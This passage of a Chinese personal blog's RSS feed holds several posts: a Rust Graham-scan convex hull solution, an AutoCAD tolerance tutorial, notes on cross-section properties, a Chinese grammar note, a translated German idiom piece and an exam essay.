&lt;p&gt;维护一个 &lt;code&gt;pid =&amp;gt; id[]&lt;/code&gt; 的 Map，并把原数组转成以 &lt;code&gt;id&lt;/code&gt; 为 key 的 Map 即可。&lt;/p&gt;
&lt;h2&gt;收快递了&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;相当于在 &lt;code&gt;{id: number, parent_id: number: name, children: self[]}&lt;/code&gt; 中找到目标。&lt;/p&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;递归即可。最后这两道标为了「困难」的题目其实就是不会 TLE 的算法题，没啥难度。倒是好久没写 JS 老是类型错误，尤其是前面 &lt;a href=&quot;#%E5%AE%9D%E8%B4%B5%E7%9A%84%E4%B8%80%E7%A5%A8&quot;&gt;宝贵的一票&lt;/a&gt; parent 就没类型了，比较讨厌。📃&lt;/p&gt;
</content:encoded></item><item><title>如何在 AutoCAD 中标注公差</title><link>https://blog.xinshijiededa.men/tolerance-in-autocad/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/tolerance-in-autocad/</guid><description>在 AutoCAD 2014 中，有两种标注公差的方式。</description><pubDate>Thu, 24 Nov 2022 17:53:08 GMT</pubDate><content:encoded>&lt;p&gt;在 AutoCAD 2014 中，有两种标注&lt;strong&gt;公差&lt;/strong&gt;的方式。&lt;/p&gt;
&lt;h2&gt;通过「特性」窗格&lt;/h2&gt;
&lt;p&gt;在已有的标注上右键，打开「特性」窗格。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/540a9fe796d6a51b73282.png&quot; alt=&quot;右键菜单&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/d5ae69a9615a1aa6437ff.png&quot; alt=&quot;公差&quot;&gt;&lt;/p&gt;
&lt;p&gt;需要将「显示公差」设为「极限偏差」。注意选择精度。&lt;/p&gt;
&lt;p&gt;「公差消去前导零」为「是」会省略小数点前面的 0。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/792b20aa1b988fe7323a6.png&quot; alt=&quot;开启公差消去前导零&quot;&gt;&lt;/p&gt;
&lt;p&gt;「公差消去后续零」为「否」会填充 0。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/a646234170dfcf2bd39fd.png&quot; alt=&quot;关闭公差消去后续零&quot;&gt;&lt;/p&gt;
&lt;h2&gt;通过「堆叠」&lt;/h2&gt;
&lt;p&gt;输入 &lt;code&gt;符号 值 上偏差/下偏差&lt;/code&gt;，然后选中 &lt;code&gt;上偏差/下偏差&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/a5e6105150a35e110e1df.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在选中的文本中有 &lt;code&gt;/&lt;/code&gt; 时右键菜单会多出一个「堆叠」的选项。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/d844e454c8b91b99c2425.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/f1eb111b161668c71d0f3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;或者，也可以点选 &lt;code&gt;TEXTEDIT&lt;/code&gt; 工具栏中的图标。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/b67a8ae0728365868acb6.png&quot; alt=&quot;图标&quot;&gt;&lt;/p&gt;
&lt;p&gt;再次右键堆叠后的文字，打开「堆叠特性」。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/c6448eb051d12a373b8fa.png&quot; alt=&quot;堆叠特性&quot;&gt;&lt;/p&gt;
&lt;p&gt;「样式」选择「公差」以消除分数线。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/69c1343f4bc77492dc2c8.png&quot; alt=&quot;堆叠特性&quot;&gt;&lt;/p&gt;
&lt;p&gt;结果如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/b763f36b74cbf9bb64f63.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://telegra.ph/file/2e5f91739f4a585055e57.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;以上。🅰️&lt;/p&gt;
</content:encoded></item><item><title>Graham 扫描法求凸包</title><link>https://blog.xinshijiededa.men/erect-the-fence/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/erect-the-fence/</guid><description>在一个二维的花园中，有一些用 $(x, y)$ 坐标表示的树。由于安装费用十分昂贵，你的任务是先用最短的绳子围起所有的树。只有当所有的树都被绳子包围时，花园才能围好栅栏。你需要找到正好位于栅栏边界上的树的坐标。</description><pubDate>Sat, 19 Nov 2022 22:58:41 GMT</pubDate><content:encoded>&lt;h2&gt;题目&lt;/h2&gt;
&lt;p&gt;今天的力扣（LCUS）每日挑战是 &lt;a href=&quot;https://leetcode.cn/problems/erect-the-fence/&quot;&gt;587. 安装栅栏&lt;/a&gt;．&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在一个二维的花园中，有一些用 $(x, y)$ 坐标表示的树．由于安装费用十分昂贵，你的任务是先用最短的绳子围起所有的树．只有当所有的树都被绳子包围时，花园才能围好栅栏．你需要找到正好位于栅栏边界上的树的坐标．&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;知识点&lt;/h2&gt;
&lt;p&gt;其实质是求若干点组成的二维 &lt;a href=&quot;https://oi-wiki.org/geometry/convex-hull/&quot;&gt;凸包&lt;/a&gt;（convex hull）．常用的求法有 Graham 扫描法（&lt;a href=&quot;https://en.wikipedia.org/wiki/Graham_scan&quot;&gt;Graham&apos;s scan&lt;/a&gt;）和 Andrew 算法，本文提供了一个由 Rust 实现的 Graham 扫描法．&lt;/p&gt;
&lt;h2&gt;思路&lt;/h2&gt;
&lt;p&gt;算法的步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;若点个数少于 3 个，则直接返回输入．否则按如下方法求解．&lt;/li&gt;
&lt;li&gt;首先，找出纵坐标最小的点．若有多个，则选横坐标最小的点．以该点建立极坐标系．&lt;/li&gt;
&lt;li&gt;此时，将所有的点按照极角的大小升序排列，若有极角相同的，则再按该点到极点距离升序排列．&lt;/li&gt;
&lt;li&gt;然后维护一个栈．先将排列好的点的前两个入栈，然后对于其后的每一个点 $C$，记栈中最后一个点为 $B$，倒数第二个点为 $A$，若以 $A$ 为圆心，$\overrightarrow{AC}$ 在 $\overrightarrow{AB}$ 顺时针方向，则说明为凹，需要出栈一次，重复上述步骤，直至$\overrightarrow{AC}$ 与 $\overrightarrow{AB}$ 重合，或前者在后者逆时针方向．此时再将 C 点入栈．&lt;/li&gt;
&lt;li&gt;处理完所有的点后，需要再找出不在栈中但在栈的最后一个点与栈的第一个点构成的线段上的点．&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;示例&lt;/h2&gt;
&lt;h3&gt;输入数据&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;[[3,0],[4,0],[5,0],[6,1],[7,2],[7,3],[7,4],[6,5],[5,5],[4,5],[3,5],[2,5],[1,4],[1,3],[1,2],[2,1],[4,2],[0,3]]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;- - * * * * * -
- * - - - - - *
* * - - - - - *
- * - - * - - *
- - * - - - * -
- - - * * * - -
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;预期结果&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;[[4,5],[2,5],[6,1],[3,5],[2,1],[1,4],[1,2],[7,4],[7,3],[7,2],[3,0],[0,3],[5,0],[5,5],[4,0],[6,5]]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;- - * * * * * -
- * - - - - - *
* - - - - - - *
- * - - - - - *
- - * - - - * -
- - - * - * - -
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;错误结果&lt;/h3&gt;
&lt;p&gt;若没有第 5 步，则缺少两点 $(1, 2), (2, 1)$ $\small{\mathrm{(0-indexed)}}$．&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;[[7,3],[5,0],[7,4],[4,5],[1,4],[4,0],[5,5],[6,1],[3,0],[6,5],[2,5],[7,2],[0,3],[3,5]]
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;- - * * * * * -
- * - - - - - *
* - - - - - - *
- - - - - - - *
- - - - - - * -
- - - * * * - -
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;计算&lt;/h2&gt;
&lt;p&gt;需要用到一些向量的性质．&lt;/p&gt;
&lt;h3&gt;判断逆时针&lt;/h3&gt;
&lt;p&gt;两向量叉积为正，则 $\overrightarrow{AC}$ 在 $\overrightarrow{AB}$ 的逆时针方向．&lt;/p&gt;
&lt;h3&gt;判断点在线段上&lt;/h3&gt;
&lt;p&gt;记线段为 $AB$，点为 $P$，保证 $A$、$B$、$P$ 三点不重合．若 $\overrightarrow{AP}\cdot\overrightarrow{BP} = -|AP|\cdot|BP|$，则点在线段上．&lt;/p&gt;
&lt;h2&gt;代码&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;use std::{cmp::Ordering::*, collections::HashSet};
#[derive(Copy, Clone, Debug, Hash, Eq, PartialEq)]
struct Tree(i32, i32);
impl Solution {
    #[inline]
    fn cross_product(x_1: i32, y_1: i32, x_2: i32, y_2: i32) -&amp;gt; i32 {
        x_1 * y_2 - x_2 * y_1
    }

    pub fn outer_trees(trees: Vec&amp;lt;Vec&amp;lt;i32&amp;gt;&amp;gt;) -&amp;gt; Vec&amp;lt;Vec&amp;lt;i32&amp;gt;&amp;gt; {
        if trees.len() &amp;lt; 3 {
            return trees;
        }
        let mut init = (114514, 114514);
        trees.iter().for_each(|t| match t[1].cmp(&amp;amp;init.1) {
            Less =&amp;gt; {
                init = (t[0], t[1]);
            }
            Equal =&amp;gt; {
                init.0 = init.0.min(t[0]);
            }
            _ =&amp;gt; {}
        });
        // println!(&amp;quot;左下角的点是 {:?}&amp;quot;, init);
        let mut trees: Vec&amp;lt;Tree&amp;gt; = trees
            .into_iter()
            .map(|t| Tree(t[0] - init.0, t[1] - init.1))
            // 这里以左下角的点为 (0, 0)
            .collect();
        trees.sort_by(
            |a, b| match { 0.cmp(&amp;amp;Self::cross_product(a.0, a.1, b.0, b.1)) } {
                Equal =&amp;gt; (a.0.pow(2) + a.1.pow(2)).cmp(&amp;amp;(b.0.pow(2) + b.1.pow(2))),
                res =&amp;gt; res,
            },
        );
        let mut stack = Vec::new();
        stack.push(trees[0]);
        stack.push(trees[1]);
        for t in trees.iter().skip(2) {
            while {
                let length = stack.len();
                length &amp;gt; 1 &amp;amp;&amp;amp; {
                    let (a, b) = (stack[stack.len() - 2], stack[stack.len() - 1]);
                    let x_1 = t.0 - a.0;
                    let y_1 = t.1 - a.1;
                    let x_2 = b.0 - a.0;
                    let y_2 = b.1 - a.1;
                    Self::cross_product(x_1, y_1, x_2, y_2) &amp;gt; 0
                }
            } {
                stack.pop().unwrap();
            }
            stack.push(t.clone());
        }
        let mut trees: HashSet&amp;lt;_&amp;gt; = trees.into_iter().collect();
        for x in &amp;amp;stack {
            trees.remove(x);
        }
        let Tree(p1x, p1y) = stack[stack.len() - 1];
        let Tree(p2x, p2y) = stack[0];
        let extra: Vec&amp;lt;Tree&amp;gt; = trees // 栈中最后一个点与栈中第一个点构成的线段上的点
            .into_iter()
            .filter_map(|a| {
                let Tree(p_x, p_y) = a;
                let vec1 = (p_x - p1x, p_y - p1y);
                let vec2 = (p_x - p2x, p_y - p2y);
                if (vec1.0 * vec2.0 + vec1.1 * vec2.1).pow(2)
                    == (vec1.0.pow(2) + vec1.1.pow(2)) * (vec2.0.pow(2) + vec2.1.pow(2))
                {
                    Some(a)
                } else {
                    None
                }
            })
            .collect();
        stack
            .into_iter()
            .chain(extra.into_iter())
            .map(|x| vec![x.0 + init.0, x.1 + init.1])
            .collect()
    }
}

// 以下是测试部分
struct Solution;
fn main() {
    let res: HashSet&amp;lt;Vec&amp;lt;i32&amp;gt;&amp;gt; = HashSet::from_iter(
        Solution::outer_trees(vec![vec![1, 1], vec![2, 2],
        vec![2, 0], vec![2, 4], vec![3, 3], vec![4, 2]]).into_iter(),
    );
    assert_eq!(
        res,
        HashSet::from_iter(
            vec![vec![1, 1], vec![2, 0], vec![4, 2],
            vec![3, 3], vec![2, 4]].into_iter()
        )
    );

    let res: HashSet&amp;lt;Vec&amp;lt;i32&amp;gt;&amp;gt; = HashSet::from_iter(Solution::outer_trees(vec![
        vec![3, 0], vec![4, 0], vec![5, 0], vec![6, 1], vec![7, 2], vec![7, 3],
        vec![7, 4], vec![6, 5], vec![5, 5], vec![4, 5], vec![3, 5], vec![2, 5],
        vec![1, 4], vec![1, 3], vec![1, 2], vec![2, 1], vec![4, 2], vec![0, 3]
    ]));
    assert_eq!(
        res, HashSet::from_iter(
            vec![vec![4, 5], vec![2, 5], vec![6, 1], vec![3, 5], vec![2, 1],
            vec![1, 4], vec![1, 2], vec![7, 4], vec![7, 3], vec![7, 2], vec![3, 0],
            vec![0, 3], vec![5, 0], vec![5, 5], vec![4, 0], vec![6, 5]].into_iter()
        )
    );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;以上．🌲&lt;/p&gt;
</content:encoded></item><item><title>截面的几何性质</title><link>https://blog.xinshijiededa.men/geometric-properties-of-cross-sections/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/geometric-properties-of-cross-sections/</guid><pubDate>Sat, 19 Nov 2022 16:59:30 GMT</pubDate><content:encoded>&lt;h2&gt;静距和形心&lt;/h2&gt;
&lt;h3&gt;定义&lt;/h3&gt;
&lt;p&gt;$S_z$ 表示截面到 $z$ 轴的静距， $y_C$ 表示形心的 $y$ 轴坐标．&lt;/p&gt;
&lt;p&gt;静距的量纲为长度的 3 次方．&lt;/p&gt;
&lt;p&gt;截面对某个轴线的静距是微元面积与其到该轴线距离的乘积的积分，即&lt;/p&gt;
&lt;p&gt;$$
S_y=\int\limits_{A} z\mathrm d A
$$&lt;/p&gt;
&lt;p&gt;$$
S_z=\int\limits_{A} y\mathrm d A
$$&lt;/p&gt;
&lt;h3&gt;定理&lt;/h3&gt;
&lt;p&gt;由&lt;strong&gt;合力矩定理&lt;/strong&gt;可得&lt;/p&gt;
&lt;p&gt;$$
z_C=\dfrac{S_y}{A}, y_C=\dfrac{S_z}{A}.
$$&lt;/p&gt;
&lt;p&gt;故我们有&lt;/p&gt;
&lt;p&gt;$$
S_y=z_CA, S_z=y_CA.
$$&lt;/p&gt;
&lt;p&gt;如果我们选择的&lt;strong&gt;坐标轴&lt;/strong&gt;穿过了形心，则其称作&lt;strong&gt;形心轴&lt;/strong&gt;．此时 $z_C$ 或 $y_C$ 为 $0$ ．又 $A$ 不为 $0$ ，所以 $S_y$ 或 $S_z$ 为 $0$．即有定理：&lt;strong&gt;若坐标轴是形心轴，则截面对其静矩为 $0$&lt;/strong&gt;．其逆命题也成立．&lt;/p&gt;
&lt;h3&gt;计算&lt;/h3&gt;
&lt;p&gt;若界面形状由多个基本图形组成，则形心坐标为各图形静距之和与各图形面积之和的比值．&lt;/p&gt;
&lt;p&gt;实际计算中，可以记住基本图形的公式，无需通过积分求．&lt;/p&gt;
&lt;h4&gt;矩形的静距&lt;/h4&gt;
&lt;p&gt;矩形的静距为长、宽、矩形形心到轴距离三者的乘积：&lt;/p&gt;
&lt;p&gt;$$
S_z=bh\cdot\dfrac 1 2 h=\dfrac 1 2 bh^2.
$$&lt;/p&gt;
&lt;h2&gt;惯性矩&lt;/h2&gt;
&lt;h3&gt;定义&lt;/h3&gt;
&lt;p&gt;惯性矩的量纲为长度的 4 次方．&lt;/p&gt;
&lt;p&gt;截面对某个轴线的惯性矩是微元面积与其到该轴线距离 2 次方乘积的积分，即&lt;/p&gt;
&lt;p&gt;$$
I_{z}=\int\limits_{A} y^{2} \mathrm{~d} A
$$&lt;/p&gt;
&lt;p&gt;$$
I_{y}=\int\limits_{A} z^{2} \mathrm{~d} A
$$&lt;/p&gt;
&lt;h3&gt;计算&lt;/h3&gt;
&lt;h4&gt;矩形的惯性矩&lt;/h4&gt;
&lt;p&gt;对 $z$ 轴&lt;/p&gt;
&lt;p&gt;$$
I_z=\frac{bh^3}{3}
$$&lt;/p&gt;
&lt;p&gt;其中， $b$ 为宽， $h$ 为高．&lt;/p&gt;
&lt;p&gt;对形心轴&lt;/p&gt;
&lt;p&gt;$$
I_z=\frac{bh^3}{12}
$$&lt;/p&gt;
&lt;h4&gt;圆的惯性矩&lt;/h4&gt;
&lt;p&gt;对形心轴&lt;/p&gt;
&lt;p&gt;$$
I_z = \frac{\pi D^4}{64}
$$&lt;/p&gt;
&lt;h4&gt;圆环的惯性矩&lt;/h4&gt;
&lt;p&gt;$$
I_z = \frac{\pi D^4(1-{\frac d D}^4)}{64}
$$&lt;/p&gt;
&lt;p&gt;其中， $d$ 为内环直径， $D$ 为外环直径．&lt;/p&gt;
&lt;h4&gt;三角形的惯性矩&lt;/h4&gt;
&lt;p&gt;$$
I_z = \frac{bh^3}{36}
$$&lt;/p&gt;
&lt;p&gt;其中， $b$ 为底边长， $h$ 为高．&lt;/p&gt;
&lt;h3&gt;定理&lt;/h3&gt;
&lt;p&gt;由&lt;strong&gt;平行轴定理&lt;/strong&gt;，对&lt;strong&gt;转动惯量&lt;/strong&gt;，我们有&lt;/p&gt;
&lt;p&gt;$$
I_{z&apos;}=I_C+Md^2
$$&lt;/p&gt;
&lt;p&gt;其中， $M$ 为刚体质量．&lt;/p&gt;
&lt;p&gt;对惯性矩，我们也有&lt;/p&gt;
&lt;p&gt;$$
I_z = I_x + Ad^2
$$&lt;/p&gt;
&lt;h2&gt;极惯性矩&lt;/h2&gt;
&lt;h3&gt;定义&lt;/h3&gt;
&lt;p&gt;截面对于一个轴的&lt;strong&gt;极惯性矩&lt;/strong&gt;，又称&lt;strong&gt;截面二次极矩&lt;/strong&gt;，是截面上微元面积与其到坐标原点距离 2 次方乘积的积分，即&lt;/p&gt;
&lt;p&gt;$$
I_p = \int\limits_A\rho^2\mathrm d A
$$&lt;/p&gt;
&lt;p&gt;其中， $\rho$ 为微元距轴的距离．&lt;/p&gt;
&lt;p&gt;有&lt;/p&gt;
&lt;p&gt;$$
I_p = \int\limits_A\rho^2\mathrm d A=\int\limits_A(z^2+y^2)\mathrm d A=I_y+I_z.
$$&lt;/p&gt;
&lt;p&gt;以上．🪵&lt;/p&gt;
</content:encoded></item><item><title>「是的，我很好」</title><link>https://blog.xinshijiededa.men/i-am-fine/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/i-am-fine/</guid><pubDate>Fri, 18 Nov 2022 22:49:48 GMT</pubDate><content:encoded>&lt;p&gt;&amp;lt;u&amp;gt;胡桃沢 · サタニキア · マクドウェル&amp;lt;/u&amp;gt;在频道「心惊报」上 &lt;a href=&quot;https://t.me/c/1501598444/166331&quot;&gt;投稿&lt;/a&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;//telegra.ph/file/00734577b158cb8de66da.jpg&quot; alt=&quot;多邻国题目截图&quot;&gt;&lt;/p&gt;
&lt;p&gt;虽然多邻国的「通过中文学…」的课程中，句子翻译接受的答案数量与英文课程相比来说少得可怜，但是&amp;lt;span lang=&amp;quot;ja&amp;quot;&amp;gt;「はい、元気です」&amp;lt;/span&amp;gt;这一句话在给定的词汇下，的确只能翻译成「是的，我很好」而不是「是，我好&amp;lt;i&amp;gt;的[sic]&amp;lt;/i&amp;gt;很」。首先，在形容词後应该用「得 + 副词」修饰程度，而非「的」。粤语没有这个问题，因为「&amp;lt;ruby&amp;gt;的&amp;lt;rt&amp;gt;dik1&amp;lt;/rt&amp;gt;&amp;lt;/ruby&amp;gt;」「&amp;lt;ruby&amp;gt;得&amp;lt;rt&amp;gt;dak1&amp;lt;/rt&amp;gt;&amp;lt;/ruby&amp;gt;」「&amp;lt;ruby&amp;gt;地&amp;lt;rt&amp;gt;dei6&amp;lt;/rt&amp;gt;&amp;lt;/ruby&amp;gt;」三个字的发音不同。其次，原句中没有出现程度，在这一句式中，「很」並不表示程度。比如 &lt;a href=&quot;https://cn.linkedin.com/pulse/%E5%9C%A8%E7%BE%8E%E5%9B%BD%E6%95%99%E4%B8%AD%E6%96%87%E5%BE%88%E5%AD%97%E5%9C%A8-%E5%BE%88%E5%BD%A2%E5%AE%B9%E8%AF%8D%E5%8F%A5%E4%B8%AD%E7%9A%84%E5%8A%9F%E8%83%BD%E4%BB%A5%E5%8F%8A%E5%AF%B9%E6%95%99%E5%B0%B1%E5%AD%97%E7%9A%84%E6%83%B3%E6%B3%95-thomas-wong-wong&quot;&gt;这篇文章&lt;/a&gt; 中就提到：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;今天很热。她很高兴。我的猫很聪明。英语很难。
在这些句子里，形容词:“热”、“高兴”、“聪明”、“难”前都有一个副词“很”，这个“很”字，不总是代表“非常”或“&amp;lt;i&amp;gt;及[sic]&amp;lt;/i&amp;gt;其”的意思，而只是语气的需要。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因为你毕竟不能说「今天是热的」「她是高兴的」「我的猫是聪明的」「英语是难的」「我是好的」，所以你只能借助「很」「挺」这几个词来连接主语和形容词。&lt;/p&gt;
&lt;p&gt;&amp;lt;span class=&amp;quot;dead&amp;quot;&amp;gt;王力&amp;lt;/span&amp;gt;的《中国现代语法》中也说：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;试拿“两家很和厚”和“两家和厚得很”相比较，则见后者比前者更有力量，这是因为特别着重“很”字，把它升为次系谓语的缘故。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;尽管如此，我都不推荐你在多邻国通过中文（简体）学任何非汉语语言。&lt;/p&gt;
</content:encoded></item><item><title>下蛋的毛奶猪</title><link>https://blog.xinshijiededa.men/eierlegende-wollmilchsau/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/eierlegende-wollmilchsau/</guid><description>如果「X」不成功的话，这会是 Elon Musk 的「Everything App」的一个良好的暂定名称。</description><pubDate>Sat, 08 Oct 2022 14:47:27 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;本文译自德国驻美大使馆 2011 年 10 月 28 日的文章：&amp;lt;span lang=&apos;de&apos;&amp;gt;&lt;a href=&quot;https://germanyinusa.com/2011/10/28/word-of-the-week-eierlegende-wollmilchsau/&quot;&gt;&lt;em&gt;Word of the Week: Eierlegende Wollmilchsau&lt;/em&gt;&lt;/a&gt;&amp;lt;/span&amp;gt;。封面图片：&lt;a href=&quot;https://de.wikipedia.org/wiki/Datei:Wollmilchsau.png&quot;&gt;Eierlegende Wollmilchsau, German for &amp;quot;egg-laying wool-milk-sow&amp;quot;&lt;/a&gt; by &lt;a href=&quot;https://de.wikipedia.org/wiki/User:Pixelrausch&quot;&gt;de:User:Pixelrausch&lt;/a&gt;, &lt;a href=&quot;https://creativecommons.org/licenses/by-sa/2.0&quot;&gt;CC BY-SA 2.0&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;想象这样一幅画面：一头猪，浑身长着蓬松的毛，会下蛋，会产奶。这就是本周的关键词——&amp;lt;em lang=&amp;quot;de&amp;quot;&amp;gt;Eierlegende Wollmilchsau&amp;lt;/em&amp;gt;，直译为「生蛋的　羊毛－牛奶－母猪」。虽然这种小动物可能听起来有点像自然界的怪胎，但它确是每个农民的梦想——结合了鸡（下蛋）、羊（产毛）、牛（产奶）和猪（做成熏肉）的品质的完美农场动物。它味道鲜美，还可以生产所有的日常必需品：它是一种没有缺点的动物。不消说，这种生物并不存在。&lt;/p&gt;
&lt;p&gt;虽然这样一种可爱、美味又有用的生物可能不存在，但它确实存在于比喻中。其比喻意义是试图做多种工作的工具或人。当然，找到像这样的一个全能的工具或人，几乎和找到神话中的生物一样难。&lt;/p&gt;
&lt;p&gt;是故如今该词语大多被用于描述一些无法实现的理想。这证明德国人不仅具有精巧的讽刺意识，而且比人们认为的更有创造力。一个完美而又讽刺的使用例是，招聘广告上的要求如此之多、如此之泛，以至于没有一个人会满足所有这些要求。&lt;/p&gt;
&lt;p&gt;不过，随着新技术的惊人发展，完全可以想象这个词会有新的含义。过去，最接近这个词的东西是瑞士军刀，但看起来这个词将能出色地形容新一代的智能机。至于手机公司是否乐意他们的产品被描述为「下蛋的毛奶猪」，那就又是另一回事了。🥚&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E7%B4%84%E7%BF%B0%C2%B7%E6%A0%BC%E9%AD%AF%E4%BC%AF&quot;&gt;John Gruber&lt;/a&gt; 在其博客 Daring Fireball 中 &lt;a href=&quot;https://daringfireball.net/linked/2022/10/07/eierlegende-wollmilchsau&quot;&gt;引用了这篇文章并评论道&lt;/a&gt;：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果「X」不成功的话，这会是 Elon Musk 的「&lt;a href=&quot;https://daringfireball.net/2022/10/everything&quot;&gt;Everything App&lt;/a&gt;」的一个良好的暂定名称（译注：原文为 &lt;a href=&quot;https://zh.wikipedia.org/wiki/%E6%9A%82%E5%AE%9A%E5%90%8D%E7%A7%B0&quot;&gt;working name&lt;/a&gt;）。
&lt;a href=&quot;https://twitter.com/mmackh/status/1578216921291542528&quot;&gt;感谢 Maximilian Mackh 提供的链接&lt;/a&gt;。（还有感谢德国大使馆将这一「春梦」写成一篇有趣的文章。）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;2022 年 10 月 8 日。&lt;a href=&quot;https://ipfs.io/ipfs/Qmbf73dbDuQv4zss9Mf1164kZecqNNKBYx7q9CLstCnxHf/&quot;&gt;点此在 IPFS 上查看&lt;/a&gt;。&lt;/p&gt;
</content:encoded></item><item><title>逻辑和无逻辑</title><link>https://blog.xinshijiededa.men/logical-or-not/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/logical-or-not/</guid><description>《考纲》「要求考生克服紧张情绪，以平和的心态参加考试，合理支配考试时间，以实事求是的科学态度解答试题，树立战胜困难的信心，体现锲而不舍的精神」。</description><pubDate>Fri, 07 May 2021 21:29:23 GMT</pubDate><content:encoded>&lt;p&gt;北京高考英语、生物和语文注重考查逻辑。&lt;/p&gt;
&lt;p&gt;这是我在江苏未曾想到的。以英语为例，就是说即使译成中文，明明白白地知道作者在说什么，你也不知道依逻辑推断出的正确的答案。我第一次做北京的一篇简单的阅读，四道选择居然全部错误：你无法在文章中找到完全匹配的答案。命题人试图通过「同义替换」来考察，然而他们的想法天马行空而深刻奇妙，替换后的内容与原文是否一致，全仗那标准答案说了算。&lt;/p&gt;
&lt;p&gt;怎么能说是有逻辑呢？&lt;/p&gt;
&lt;p&gt;无独有偶，语文的非连续性文本阅读也如此，不过稍为简单一些。这样一来，我在阅读文章的时候会想，我理解的作者那乖张的说话口气不是叙述时的自然流露，而是为了印证中心论点，并且试图脑控读者。&lt;/p&gt;
&lt;p&gt;而生物的逻辑体现在实验题上。从描述实验现象到写出推断过程，从填空到画示意图，考察生物基础知识的着实很少，考察逻辑「关系」的很多。大抵就是让看看两者之间的关系、三者之间上下游的调控关系、四者之间是否有协同作用… 不一而足。而生物老师的讲课语音语调都没有突出重点，让所有上伊的课的人都昏昏欲睡。&lt;/p&gt;
&lt;p&gt;至于数学，&lt;a href=&quot;https://telegra.ph/%E5%8C%97%E4%BA%AC%E9%AB%98%E8%80%83%E7%90%86%E7%A7%91%E6%95%B0%E5%AD%A6%E5%8E%8B%E8%BD%B4%E9%A2%98%E9%A3%8E%E6%A0%BC%E6%A6%82%E8%BF%B0-05-07&quot;&gt;压轴题固然不是我所能做出来的&lt;/a&gt;，顶多第二问能写上一些。主要是过于创新，导致平时训练的内容和考察的内容没有什么关系，感觉练了考试也只能听天由命——这在任何学科上都是常有的现象。而且简单的题过于简单，不太适合咱这个分数段上的。而且平时模拟考试也很少，周测只有短短的 45 分钟，实在找不到感觉。&lt;/p&gt;
&lt;p&gt;数学老师常说，《考纲》「要求考生克服紧张情绪，以平和的心态参加考试，合理支配考试时间，以实事求是的科学态度解答试题，树立战胜困难的信心，体现锲而不舍的精神」。就好像你深知你练习的内容可能跟高考毫无关联，深知你高考的时候该错的还是会错，深知你要用你那并不娴熟的逻辑推理去做那并没有什么逻辑道理的题，但是你依然满怀信心地参加考试一样。📝&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;2021 年 5 月 7 日 9 时于纯纯写作。&lt;/p&gt;
</content:encoded></item><item><title>自习室</title><link>https://blog.xinshijiededa.men/study-rooms/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/study-rooms/</guid><description>这家自习室主打暗室自习，突出一个「暗」字。一推开门，就跟钻进黑暗隧道差不多。只在有人学习的地方会亮起一盏黄色的灯，像是隧道尽头的亮光。 这一点亮光隐喻着「希望」。</description><pubDate>Sat, 13 Mar 2021 22:50:52 GMT</pubDate><content:encoded>&lt;p&gt;昨天早上偶然听到一个人谈论他在付费自习室的体验。&lt;/p&gt;
